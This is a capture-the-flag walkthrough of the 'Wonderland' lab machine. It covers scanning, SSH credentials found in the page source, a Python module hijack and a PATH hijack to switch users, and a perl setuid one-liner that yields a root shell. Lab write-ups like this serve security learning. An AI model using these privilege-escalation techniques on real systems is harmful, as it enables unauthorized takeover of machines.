# Wonderland

## nmap scan
nmap -sC -sV -A IP -v -oN ./nmap/initial.txt

intial
```
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Follow the white rabbit.
```

## gobuster scan
gobuster dir -w /usr/share/wordlists/dirb/common.txt -o goCommon.txt -u http://IP
COMMON
```
/img (Status: 301)
/index.html (Status: 301)
/r (Status: 301)
```
/img has 3 images, one of them, namely white_rabbit_1.jpg


`steghide --extract -sf white_rabbit_1.jpg`

> follow the r a b b i t

we know there is a directory called r, we notice here that there is a space in the word rabbit lets go down these directories

http://IP/r/a/b/b/i/t

this page contains the following and the image called alice_door.png

```
Open the door and enter wonderland

"Oh, you’re sure to do that," said the Cat, "if you only walk long enough."

Alice felt that this could not be denied, so she tried another question. "What sort of people live about here?"

"In that direction,"" the Cat said, waving its right paw round, "lives a Hatter: and in that direction," waving the other paw, "lives a March Hare. Visit either you like: they’re both mad."
```

if we look at the page source we find the following interesting paragraph
`<p style="display: none;">alice:HowDothTheLittleCrocodileImproveHisShiningTail</p>`

this is ssh creds, we log in using `ssh alice@IP` 
using passwd `HowDothTheLittleCrocodileImproveHisShiningTail`

one of the hints mentions everything is upside down here, maybe that means user flag is in the root directory, if we ls on the directory we land in we see there is a root.txt, lets check if we can cat a user flag from the root directory

cat /root/user.txt
```
FLAG
```


if we sudo -l and enter alice's password we notice we can run a file as rabbit 

we see that walrus_and_the_carpenter.py is using the random library, if we create a random.py file of our own we can overwrite the one it is using

vim random.py

```
#!/bin/python

import os

os.system("/bin/bash")

``` 

`sudo -u rabbit /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py`

we now have a shell as rabbit

so we notice that teaParty calls the binary date, we can exploit this much like the last file by changin what is contained in the date binary

we do this by changin the path environment variable by doing the following `export PATH=/tmp:$PATH`
check everything is correct do echo $PATH and it should be something like this
```
/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin
```

go into /tmp using cd and create a file called date
vim date
```
#!/bin/bash

/bin/bash

```

run teaParty and we now have a shell as hatter

in the hatters directory there is a file called password.txt we cat that it shows the following
```
WhyIsARavenLikeAWritingDesk?
```
we run linpeas and find perl has suid 

we run the gtfo bins suid with the bin
```
/usr/bin/perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'
```

we now have a root shell

return back to alice's directory and cat root.txt
```
FLAG
```
